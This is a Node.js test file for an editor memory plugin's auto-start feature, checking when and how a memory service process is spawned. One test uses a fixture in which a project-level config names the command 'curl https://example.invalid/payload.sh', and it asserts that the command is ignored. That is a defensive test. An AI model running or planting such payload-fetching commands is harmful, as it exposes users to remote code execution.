/**
 * Tests for the optional memory-service auto-start in memory-plugin.js.
 *
 * Run: node opencode/tests/autostart.test.js
 *
 * autoStart spawns a process from inside the editor, so its decisions (start or
 * not, which command, from which config file, how long to wait) are pinned here
 * with injected dependencies instead of a live service. The failures that matter
 * in production: a second instance started next to a healthy one, a command
 * named by a cloned repository, and a start that hangs the editor.
 */

import { test } from "node:test"
import assert from "node:assert"
import http from "node:http"
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises"
import { homedir, tmpdir } from "node:os"
import path from "node:path"

import { _internal } from "../memory-plugin.js"

const { DEFAULT_CONFIG, endpointPort, ensureMemoryService, loadConfig } = _internal

function configWith(autoStart) {
  return {
    memoryService: {
      ...DEFAULT_CONFIG.memoryService,
      autoStart: { ...DEFAULT_CONFIG.memoryService.autoStart, ...autoStart },
    },
  }
}

function fakeChild(pid = 4242) {
  return {
    pid,
    unref() {},
    on() {},
  }
}

// Polling sleeps are stubbed out; the deadline itself is real, so the timeout
// cases use a small startTimeoutMs instead of a fake clock.
const noSleep = async () => {}

test("autoStart is off unless the configuration enables it", async () => {
  let spawnCalls = 0
  let healthCalls = 0
  const started = await ensureMemoryService(configWith({ enabled: false }), {
    health: async () => { healthCalls += 1; return { status: "healthy" } },
    spawn: () => { spawnCalls += 1 },
  })
  assert.strictEqual(started, null)
  assert.strictEqual(spawnCalls, 0)
  assert.strictEqual(healthCalls, 0)
})

test("a reachable service is reused instead of starting a second instance", async () => {
  let spawnCalls = 0
  const started = await ensureMemoryService(configWith({ enabled: true }), {
    health: async () => ({ status: "healthy" }),
    spawn: () => { spawnCalls += 1 },
  })
  assert.strictEqual(started, null)
  assert.strictEqual(spawnCalls, 0)
})

test("endpointPort keeps standard ports and rejects garbage", () => {
  assert.strictEqual(endpointPort("http://127.0.0.1:8123"), 8123)
  // URL drops :80 and :443, and the launcher must not fall back to 8000 while
  // the plugin polls the standard port.
  assert.strictEqual(endpointPort("http://127.0.0.1"), 80)
  assert.strictEqual(endpointPort("https://memory.example.com"), 443)
  assert.strictEqual(endpointPort("not a url"), null)
})

test("the default launcher is given the port of the configured endpoint", async () => {
  const child = fakeChild()
  const spawnCalls = []
  let healthCalls = 0
  const config = configWith({ enabled: true, startTimeoutMs: 5000 })
  config.memoryService.endpoint = "http://127.0.0.1:8123"

  const started = await ensureMemoryService(config, {
    health: async () => {
      healthCalls += 1
      if (healthCalls === 1) throw new Error("down")
      return { status: "healthy" }
    },
    sleep: noSleep,
    platform: "linux",
    spawn: (command, args, options) => {
      spawnCalls.push({ command, args, options })
      return child
    },
  })

  assert.strictEqual(started, child)
  // `memory launch` moves to a free port when 8123 is taken, so the plugin has
  // to name the port its own endpoint uses.
  assert.deepStrictEqual(spawnCalls, [{
    command: "memory",
    args: ["launch", "--port", "8123"],
    options: {
      stdio: "ignore",
      windowsHide: true,
      cwd: homedir(),
      detached: true,
    },
  }])
})

test("a custom command is spawned exactly as configured", async () => {
  const child = fakeChild()
  const spawnCalls = []
  let healthCalls = 0

  const started = await ensureMemoryService(configWith({
    enabled: true,
    command: ["/opt/memory/start-service", "--background"],
    startTimeoutMs: 5000,
  }), {
    health: async () => {
      healthCalls += 1
      if (healthCalls === 1) throw new Error("down")
      return { status: "healthy" }
    },
    sleep: noSleep,
    platform: "linux",
    spawn: (command, args, options) => {
      spawnCalls.push({ command, args, options })
      return child
    },
  })

  assert.strictEqual(started, child)
  assert.strictEqual(spawnCalls.length, 1)
  assert.strictEqual(spawnCalls[0].command, "/opt/memory/start-service")
  assert.deepStrictEqual(spawnCalls[0].args, ["--background"])
})

test("Windows does not detach the child", async () => {
  let detached
  await ensureMemoryService(configWith({ enabled: true, startTimeoutMs: 50 }), {
    health: async () => { throw new Error("down") },
    sleep: noSleep,
    platform: "win32",
    spawn: (_command, _args, options) => { detached = options.detached; return fakeChild() },
  })
  assert.strictEqual(detached, false)
})

test("a service that never answers is bounded by startTimeoutMs", async () => {
  const messages = []
  const startedAt = Date.now()
  const started = await ensureMemoryService(configWith({
    enabled: true,
    startTimeoutMs: 50,
  }), {
    // Accepts the connection and never answers.
    health: () => new Promise(() => {}),
    sleep: noSleep,
    spawn: () => fakeChild(),
    log: async (message) => { messages.push(message) },
  })

  const elapsed = Date.now() - startedAt
  assert.ok(elapsed <= 400, `waited ${elapsed} ms`)
  assert.match(messages.join("\n"), /did not answer within 50 ms/)
  assert.ok(started)
})

test("the start decision uses the storage-free health route", async () => {
  // A detailed health check that hangs while /api/health answers must not make
  // the plugin think the service is down: `memory launch` could then replace a
  // listener that the dashboard and other clients are using.
  const server = http.createServer((req, res) => {
    if (req.url === "/api/health") {
      res.writeHead(200, { "content-type": "application/json" })
      res.end('{"status":"healthy"}')
    }
    // /api/health/detailed never answers.
  })
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve))
  const { port } = server.address()

  try {
    const config = configWith({ enabled: true, startTimeoutMs: 200 })
    config.memoryService.endpoint = `http://127.0.0.1:${port}`
    config.memoryService.timeoutMs = 5000

    let spawnCalls = 0
    const started = await ensureMemoryService(config, {
      spawn: () => { spawnCalls += 1; return fakeChild() },
      platform: "linux",
    })

    assert.strictEqual(started, null)
    assert.strictEqual(spawnCalls, 0)
  } finally {
    server.closeAllConnections?.()
    server.close()
  }
})

test("an empty command is reported and nothing is started", async () => {
  const messages = []
  const started = await ensureMemoryService(configWith({
    enabled: true,
    command: [],
    startTimeoutMs: 50,
  }), {
    health: async () => { throw new Error("down") },
    sleep: noSleep,
    spawn: () => { throw new Error("must not spawn") },
    log: async (message) => { messages.push(message) },
  })

  assert.strictEqual(started, null)
  assert.match(messages.join("\n"), /autoStart\.command is empty/)
})

async function withHome(entries, run) {
  const root = await mkdtemp(path.join(tmpdir(), "opencode-memory-config-"))
  const previousHome = process.env.HOME
  const previousUserProfile = process.env.USERPROFILE
  const previousConfig = process.env.OPENCODE_MEMORY_PLUGIN_CONFIG
  const previousAutoStart = process.env.OPENCODE_MEMORY_AUTOSTART
  delete process.env.OPENCODE_MEMORY_PLUGIN_CONFIG
  delete process.env.OPENCODE_MEMORY_AUTOSTART
  process.env.HOME = root
  // Windows homedir() reads USERPROFILE, not HOME.
  process.env.USERPROFILE = root
  try {
    for (const [relativePath, content] of Object.entries(entries)) {
      const filePath = path.join(root, relativePath)
      await mkdir(path.dirname(filePath), { recursive: true })
      await writeFile(filePath, JSON.stringify(content))
    }
    return await run(root)
  } finally {
    process.env.HOME = previousHome
    if (previousUserProfile === undefined) delete process.env.USERPROFILE
    else process.env.USERPROFILE = previousUserProfile
    if (previousConfig === undefined) delete process.env.OPENCODE_MEMORY_PLUGIN_CONFIG
    else process.env.OPENCODE_MEMORY_PLUGIN_CONFIG = previousConfig
    if (previousAutoStart === undefined) delete process.env.OPENCODE_MEMORY_AUTOSTART
    else process.env.OPENCODE_MEMORY_AUTOSTART = previousAutoStart
    await rm(root, { recursive: true, force: true })
  }
}

test("a project-level autoStart is ignored and does not spawn", async () => {
  await withHome({
    "project/.opencode/memory-plugin.json": {
      memoryService: {
        autoStart: { enabled: true, command: ["curl", "https://example.invalid/payload.sh"] },
      },
    },
  }, async (home) => {
    const warnings = []
    const projectDir = path.join(home, "project")
    const config = await loadConfig(projectDir, { warn: async (message) => { warnings.push(message) } })

    assert.strictEqual(config.memoryService.autoStart.enabled, false)
    assert.deepStrictEqual(config.memoryService.autoStart.command, DEFAULT_CONFIG.memoryService.autoStart.command)
    assert.match(warnings.join("\n"), /Ignoring memoryService\.autoStart from .*\.opencode[\\/]memory-plugin\.json/)

    let spawnCalls = 0
    const started = await ensureMemoryService(config, {
      health: async () => { throw new Error("down") },
      spawn: () => { spawnCalls += 1 },
    })
    assert.strictEqual(started, null)
    assert.strictEqual(spawnCalls, 0)
  })
})

test("a user-level autoStart is honoured", async () => {
  await withHome({
    ".config/opencode/memory-plugin.json": {
      memoryService: { autoStart: { enabled: true, command: ["memory", "launch"] } },
    },
  }, async (home) => {
    const config = await loadConfig(path.join(home, "project"))
    assert.strictEqual(config.memoryService.autoStart.enabled, true)
    assert.deepStrictEqual(config.memoryService.autoStart.command, ["memory", "launch"])
    // A partial block keeps the defaults from DEFAULT_CONFIG.
    assert.strictEqual(config.memoryService.autoStart.startTimeoutMs, 5000)
  })
})

test("OPENCODE_MEMORY_AUTOSTART enables the feature without a config file", async () => {
  await withHome({}, async (home) => {
    process.env.OPENCODE_MEMORY_AUTOSTART = "1"
    const config = await loadConfig(path.join(home, "project"))
    assert.strictEqual(config.memoryService.autoStart.enabled, true)
  })
})
